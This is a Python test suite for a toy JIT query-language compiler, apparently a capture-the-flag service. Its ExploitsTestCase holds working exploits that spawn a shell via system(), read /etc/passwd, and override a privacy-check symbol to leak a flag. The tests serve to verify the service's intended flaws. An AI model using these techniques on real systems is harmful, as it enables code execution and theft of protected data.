import json
import subprocess
import unittest
from pathlib import Path
from tempfile import TemporaryDirectory
from typing import Any


def find_compiler() -> Path:
    for p in ('cmake-build-debug', 'build', ''):
        candidate = ROOT / p / 'jit'
        if candidate.exists():
            print(f'Compiler: {candidate}')
            return candidate
    raise Exception('Compiler not found, please build it first!')


ROOT: Path = Path(__file__).absolute().parent.parent
COMPILER: Path = find_compiler()
DEMO_DIR: Path = ROOT / 'demo'


def read_json_lines(f: Path | str) -> list[Any]:
    text = f.read_text() if isinstance(f, Path) else f
    return [json.loads(l) for l in text.split('\n') if l]


def compile(code: str, output: Path) -> None:
    p = subprocess.Popen([str(COMPILER), '/dev/stdin', str(output)], stdin=subprocess.PIPE)
    p.communicate(input=code.encode(), timeout=5)
    p.wait()
    if p.returncode != 0:
        raise Exception(f'Compilation failed with code {p.returncode}')


class CompileTestCase(unittest.TestCase):
    def setUp(self) -> None:
        self.tmpdir: Path = Path(self.enterContext(TemporaryDirectory()))

    def run_prog(self, code: str, function: str = 'jit_entrypoint', param: Any = None) -> str:
        compile(code, self.tmpdir / 'code.so')
        return self.run_last(function, param)

    def run_last(self, function: str, param: Any) -> str:
        cmd: list[str] = [str(self.tmpdir / 'code.so'), function, json.dumps(param)]
        return subprocess.check_output(cmd, cwd=DEMO_DIR).decode().strip()

    def run_expr(self, code: str) -> str:
        return self.run_prog('func jit_entrypoint() { return ' + code + '; }')

    def run_stmt(self, code: str) -> str:
        return self.run_prog('func jit_entrypoint() { ' + code + ' }')


class ExpressionsTestCase(CompileTestCase):
    def test_simple_constants(self):
        self.assertEqual('1', self.run_expr('1'))
        self.assertEqual('["a",{},{"a":"b"},null,2,true,false]',
                         self.run_expr('["a", {}, {"a":"b"}, null, 2, true, false]'))

    def test_operators(self):
        self.assertEqual('9', self.run_expr('1+2*3+4-2'))
        self.assertEqual('true', self.run_expr('1 && 2'))
        self.assertEqual('false', self.run_expr('1 && 0'))
        self.assertEqual('[true,2,"ab","c7",4]', self.run_expr('[!false, 5+-3, "a"+"b", "c"+7, 2*(1+1)]'))
        self.assertEqual('[1,2,3]', self.run_expr('[len {"a":0}, len [1,2], len "abc"]'))
        self.assertEqual('[11,1]', self.run_expr('[ [5,11,3][1], {"a":1,"b":2}["a"] ]'))
        self.assertEqual('[true,false,true,true,false,true,true,false]', self.run_expr('[1==1,1!=1,1!=2, 1<2, 1>2, 1<=2, 1<=1, 1>=2]'))
        self.assertEqual('true', self.run_expr('defined 1'))
        self.assertEqual('false', self.run_expr('defined {}["a"]'))
        self.assertEqual('1', self.run_expr('-6 + 7'))

    def test_bughunt(self):
        self.assertEqual('true', self.run_expr('(!(defined 544 == 216) == (149 < --(-784 + -893)))'))
        self.assertEqual('false', self.run_expr('defined 544 == 216'))

    def test_undefined(self):
        for expr in ['0 + []', '{}["a"]', '[][0]']:
            self.assertEqual('', self.run_expr(expr))
            self.assertEqual('false', self.run_expr(f'defined ({expr})'))


class StatementsTestCase(CompileTestCase):
    def test_variables(self):
        self.assertEqual('2', self.run_stmt('a=1; a=2; return a;'))
        self.assertEqual('1', self.run_stmt('a=1; b=2; return a;'))
        self.assertEqual('4', self.run_stmt('a=1; b=5; return b-a;'))

    def test_object_assignment(self):
        self.assertEqual('[1,2,3]', self.run_stmt('a=[3,3,3]; a[0]=1 ; a[1]=2; a[2]=3; return a;'))
        self.assertEqual('{"b":2,"a":1}', self.run_stmt('a={"a":0}; a["a"]=1 ; a["b"]=2; return a;'))
        self.assertEqual('[1,2,3]', self.run_stmt('a=[1]; a[+]=2; a[+]=3; return a;'))
        self.assertEqual('[[1],[1],[]]', self.run_stmt('a=[[], [], []]; a[0][+]=1; a[1]=a[0]; return a;'))

    def test_print(self):
        self.assertEqual('1\n2', self.run_stmt('print(1); return print(1+1, 3);'))

    def test_print_nl(self):
        self.assertEqual('"a\\nb\\r\\nc"', self.run_stmt(r'print("a\nb\u000d\u000ac");'))

    def test_functions(self):
        code = '''
        func xadd(a, b) { return a+2*b; }
        func jit_entrypoint() { return xadd(xadd(1,2), xadd(3,4)); }  // = 5 + 2*11
        '''
        self.assertEqual('27', self.run_prog(code))
        code = '''
        func helper(a, b) { a = a + b; return a; }
        func jit_entrypoint() { return helper(1, 2); }
        '''
        self.assertEqual('3', self.run_prog(code))

    def test_if(self):
        self.assertEqual('2', self.run_stmt('''a = 0; if 1 { a = 2; } return a;'''))
        self.assertEqual('2', self.run_stmt('''a = 0; if 1 a = 2; return a;'''))
        self.assertEqual('2', self.run_stmt('''if 1 { a = 2; } else { a = 3; } return a;'''))
        self.assertEqual('3', self.run_stmt('''if 1*0 { a = 2; } else { a = 3; } return a;'''))

    def test_while(self):
        self.assertEqual('1', self.run_stmt('''while 0 {} return 1;'''))
        self.assertEqual('2', self.run_stmt('''while 1 { return 2; } return 1;'''))
        code = '''
        i = 5; s = 0;
        while i > 0 { s = s + i;  i = i - 1; }
        return s;
        '''
        self.assertEqual('15', self.run_stmt(code))

    def test_truth_values(self):
        true_cases = ['true', '1', '"abc"', '[1]', '{"a": 2}']
        false_cases = ['false', '0', '""', 'null', '[]', '{}', '{}[1]']
        for c in true_cases:
            self.assertEqual('1', self.run_stmt(f'''if {c} return 1; else return 0;'''))
        for c in false_cases:
            self.assertEqual('0', self.run_stmt(f'''if {c} return 1; else return 0;'''))

    def test_nonlazy_eval(self):
        base = '''
        func t(x) { print(x); return true; }
        func f(x) { print(x); return false; }
        '''
        self.assertEqual('1\n2\ntrue', self.run_prog(base + 'func jit_entrypoint() { return t(1) && t(2); }'))
        self.assertEqual('1\n2\nfalse', self.run_prog(base + 'func jit_entrypoint() { return t(1) && f(2); }'))
        self.assertEqual('1\n2\nfalse', self.run_prog(base + 'func jit_entrypoint() { return f(1) && t(2); }'))
        self.assertEqual('1\n2\nfalse', self.run_prog(base + 'func jit_entrypoint() { return f(1) && f(2); }'))
        self.assertEqual('1\n2\ntrue', self.run_prog(base + 'func jit_entrypoint() { return t(1) || t(2); }'))
        self.assertEqual('1\n2\ntrue', self.run_prog(base + 'func jit_entrypoint() { return t(1) || f(2); }'))
        self.assertEqual('1\n2\ntrue', self.run_prog(base + 'func jit_entrypoint() { return f(1) || t(2); }'))
        self.assertEqual('1\n2\nfalse', self.run_prog(base + 'func jit_entrypoint() { return f(1) || f(2); }'))

    def test_no_return(self):
        code = '''
        func a() { return 1; }
        func jit_entrypoint() { a(); }
        '''
        self.assertEqual('', self.run_prog(code))


class QueriesTestCase(CompileTestCase):
    data1 = read_json_lines(DEMO_DIR / 'data1.ndjson')

    def test_simple_query(self):
        self.assertEqual('', self.run_prog('query q on empty;', 'q'))

    def test_demodata_queries(self):
        code = '''
        func is_in_team(entry, teamname) { return entry["team"] == teamname; }
        func get_name(entry) { return entry["name"]; }
        func get_points(entry) { return entry["points"]; }
        func sum(data, acc) { return data + (acc ?: 0); }
        
        query all_entries on data1;        
        query one_member on data1 filter is_in_team map get_name limit 1;
        query team_points on data1 filter is_in_team map get_points reduce sum; 
        '''
        self.assertEqual(self.data1, read_json_lines(self.run_prog(code, 'all_entries')))
        self.assertEqual('"mkb"', self.run_last('one_member', 'saarsec'))
        self.assertEqual('200', self.run_last('team_points', 'saarsec'))

    def test_privacy(self):
        compile('query jit_entrypoint on private1;', self.tmpdir / 'code.so')
        r = subprocess.run([str(self.tmpdir / 'code.so'), 'jit_entrypoint'], cwd=DEMO_DIR,
                           stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        self.assertEqual(0, r.returncode)
        self.assertNotIn(b'SAAR', r.stdout)
        self.assertIn(b'access denied', r.stdout)

    def test_failsafe(self):
        result = self.run_prog('query jit_entrypoint on broken;')
        self.assertEqual('{"team":"x","points":1,"name":"a"}\n{"team":"x","points":1,"name":"c"}', result)


class ExploitsTestCase(CompileTestCase):
    def test_system(self):
        code = '''
        // no function checks => we can call any symbol in any library. just the calling convention is an issue
        func jit_rt_constant(){}  // nop out that rt function - constant string is in $rdi after return. Unfortunately in "".
        func jit_entrypoint() { system("sh"); }  // then we can invoke system() which links properly
        '''
        # not sure how realistic it is that we can send input to the executable.
        # maybe if we just bind the connection to the program?
        compile(code, self.tmpdir / 'code.so')
        p = subprocess.Popen([str(self.tmpdir / 'code.so'), 'jit_entrypoint'], cwd=DEMO_DIR,
                             stdout=subprocess.PIPE, stdin=subprocess.PIPE)
        output, _ = p.communicate(input=b'cat /etc/passwd', timeout=3)
        self.assertIn(b'root:x:0:0:root:/root:/bin/bash', output)

    def test_system_2(self):
        code = '''
        // no function checks => we can call any symbol in any library. just the calling convention is an issue.
        func jit_entrypoint() {
            "cat /etc/passwd" == "cat /etc/passwd";  // jit_rt_equal leaves string pointers in $rdi if both sides are same length
            system();
        }
        '''
        output = self.run_prog(code)
        print(output)
        self.assertIn('root:x:0:0:root:/root:/bin/bash', output)

        code = '''
        // no function checks => we can call any symbol in any library. just the calling convention is an issue.
        func jit_entrypoint() {
            "cat /etc/passwd" < "xxx";  // jit_rt_lt sometimes leaves string pointers in $rdi
            system();
        }
        '''
        output = self.run_prog(code)
        print(output)
        self.assertIn('root:x:0:0:root:/root:/bin/bash', output)

    def test_nop_out_privacy_check(self):
        # we can override the libjit_rt symbol which determines a collection's privacy (DataStorage::isPublic).
        code = '''
        func _ZN11DataStorage8isPublicEv(){ return true; }
        query jit_entrypoint on private1;  // some private collection
        '''
        self.assertEqual('{"flag":"SAAR{...}"}', self.run_prog(code))

    # other weaknesses: you can read/write the stack like this:
    # func f(a,b,c,d,e,f,g,h) { h=0; }  func jit_entrypoint() { f(); }
    # but that's likely not exploitable, because pointers are no valid Value


del CompileTestCase

if __name__ == '__main__':
    unittest.main()
